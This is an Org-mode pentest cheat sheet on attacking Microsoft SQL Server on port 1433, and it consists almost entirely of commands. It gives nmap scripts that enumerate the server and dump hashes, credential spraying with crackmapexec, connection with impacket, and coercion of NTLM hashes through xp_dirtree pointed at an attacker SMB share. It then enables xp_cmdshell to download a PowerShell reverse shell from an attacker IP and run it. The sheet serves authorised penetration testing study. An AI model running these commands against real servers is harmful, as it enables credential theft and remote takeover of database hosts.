:PROPERTIES:
:ID:       f4197277-0e6c-483c-9a5b-b15d54c881ce
:END:
#+title: Pentest - MSSQL - Microsoft SQL Server p 1433
#+filetags: :sql:pentest:
#+hugo_base_dir:../


* Pentest Microsoft SQL Server
** Enumeration
#+begin_src shell -n :exports both :results output verbatim :tangle file
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
#+end_src
** Test credentials
#+begin_src shell -n
crackmapexec mssql <host> -u users.txt -p passwords.txt
#+end_src
** Establish connection
#+begin_src shell
impacket-mssqlclient -dc-ip <ip> -windows-auth domain/username:password@host
#+end_src
*** List DBs
#+begin_src sql -n
SELECT name FROM master..sysdatabases;
#+end_src
*** Check permissions
#+begin_src sql -n
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
#+end_src
*** ~xp_dirtree~
#+begin_src sql -n
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
#+end_src

Use ~xp_dirtree~ to obtain NTLM hashes
#+begin_src shell -n
#victim
xp_dirtree \\<attacker_ip>\file.txt
#attacker
sudo impacket-smbserver -smb2support share $(pwd)
#+end_src
** ~xp_cmdshell~
Enable - run command - rev shell
#+begin_src shell -n
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell powershell -c iwr http://<ip>/shell.ps1 -o C:\programdata\rev.ps1
xp_cmdshell powershell -c C:\programdata\rev.ps1
#+end_src










[[https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server][hacktricks]]
